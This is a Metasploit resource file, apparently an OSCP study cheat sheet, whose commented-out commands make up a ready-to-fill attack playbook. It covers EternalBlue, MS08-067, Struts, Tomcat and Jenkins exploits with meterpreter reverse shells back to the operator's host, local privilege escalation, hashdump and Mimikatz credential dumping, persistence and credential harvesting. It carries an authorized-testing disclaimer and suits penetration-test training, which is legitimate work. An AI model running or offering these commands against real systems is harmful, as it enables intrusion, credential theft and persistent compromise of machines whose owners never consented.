# Metasploit Resource File - Common OSCP Exploits
# Usage: msfconsole -r common_exploits.rc
# Author: Brad Turner
#
# DISCLAIMER: For authorized security testing only. Do not use against systems
# without explicit written permission. The author assumes no liability for
# misuse. You are responsible for compliance with all applicable laws.
#==============================================================================

#------------------------------------------------------------------------------
# SMB EXPLOITS
#------------------------------------------------------------------------------

# EternalBlue (MS17-010) - Windows 7/Server 2008 R2
# use exploit/windows/smb/ms17_010_eternalblue
# set RHOSTS TARGET_IP
# set LHOST YOUR_IP
# set payload windows/x64/meterpreter/reverse_tcp
# exploit

# MS08-067 - Windows XP/Server 2003
# use exploit/windows/smb/ms08_067_netapi
# set RHOSTS TARGET_IP
# set LHOST YOUR_IP
# exploit

# PSExec (with creds)
# use exploit/windows/smb/psexec
# set RHOSTS TARGET_IP
# set SMBDomain DOMAIN
# set SMBUser USERNAME
# set SMBPass PASSWORD
# set payload windows/x64/meterpreter/reverse_tcp
# set LHOST YOUR_IP
# exploit

#------------------------------------------------------------------------------
# WEB EXPLOITS
#------------------------------------------------------------------------------

# Apache Struts (CVE-2017-5638)
# use exploit/multi/http/struts2_content_type_ognl
# set RHOSTS TARGET_IP
# set RPORT 8080
# set TARGETURI /struts2-showcase/
# set payload linux/x64/meterpreter/reverse_tcp
# set LHOST YOUR_IP
# exploit

# Tomcat Manager Upload
# use exploit/multi/http/tomcat_mgr_upload
# set RHOSTS TARGET_IP
# set RPORT 8080
# set HttpUsername admin
# set HttpPassword admin
# set payload java/meterpreter/reverse_tcp
# set LHOST YOUR_IP
# exploit

# Jenkins Script Console
# use exploit/multi/http/jenkins_script_console
# set RHOSTS TARGET_IP
# set RPORT 8080
# set TARGETURI /
# set payload linux/x64/meterpreter/reverse_tcp
# set LHOST YOUR_IP
# exploit

#------------------------------------------------------------------------------
# LOCAL PRIVILEGE ESCALATION
#------------------------------------------------------------------------------

# Windows - Token Impersonation (requires SeImpersonate)
# use exploit/windows/local/ms16_075_reflection_juicy
# set SESSION 1
# set LHOST YOUR_IP
# exploit

# Windows - Always Install Elevated
# use exploit/windows/local/always_install_elevated
# set SESSION 1
# set LHOST YOUR_IP
# exploit

# Linux - Dirty COW (CVE-2016-5195) - Kernel < 4.8.3
# use exploit/linux/local/dirtycow
# set SESSION 1
# set LHOST YOUR_IP
# exploit

#------------------------------------------------------------------------------
# POST EXPLOITATION
#------------------------------------------------------------------------------

# Meterpreter essentials:
# getuid                    - Current user
# sysinfo                   - System info
# getsystem                 - Attempt privesc
# hashdump                  - Dump hashes (requires SYSTEM)
# migrate -N explorer.exe   - Migrate to stable process
# shell                     - Drop to system shell
# upload /path/file         - Upload file
# download file             - Download file

# Persistence
# use exploit/windows/local/persistence_service
# set SESSION 1
# set LHOST YOUR_IP
# exploit

# Credential harvesting
# use post/windows/gather/credentials/credential_collector
# set SESSION 1
# run

# Mimikatz
# load kiwi
# creds_all
# lsa_dump_sam

#------------------------------------------------------------------------------
# SCANNING
#------------------------------------------------------------------------------

# SMB version scan
# use auxiliary/scanner/smb/smb_version
# set RHOSTS TARGET_RANGE
# run

# SMB vulnerability scan
# use auxiliary/scanner/smb/smb_ms17_010
# set RHOSTS TARGET_RANGE
# run

# HTTP version
# use auxiliary/scanner/http/http_version
# set RHOSTS TARGET_IP
# run

